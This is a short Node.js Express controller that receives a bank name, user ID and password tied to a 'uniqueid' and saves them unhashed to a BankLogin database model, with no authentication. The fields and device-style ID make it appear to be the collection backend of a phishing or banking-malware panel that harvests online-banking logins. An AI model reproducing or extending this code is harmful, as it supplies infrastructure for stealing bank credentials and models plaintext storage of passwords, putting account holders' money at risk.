import BankLogin from "../models/bankLoginModel.js";

export const saveBankLogin = async (req, res) => {
    try {
        const { uniqueid, bankName, userId, password } = req.body;

        if (!uniqueid) {
            return res.json({
                success: false,
                message: "Unique ID missing"
            });
        }

        await BankLogin.create({
            uniqueid,
            bankName,
            userId,
            password
        });

        return res.json({
            success: true,
            message: "Bank login saved successfully"
        });

    } catch (e) {
        return res.json({
            success: false,
            message: "Server error"
        });
    }
};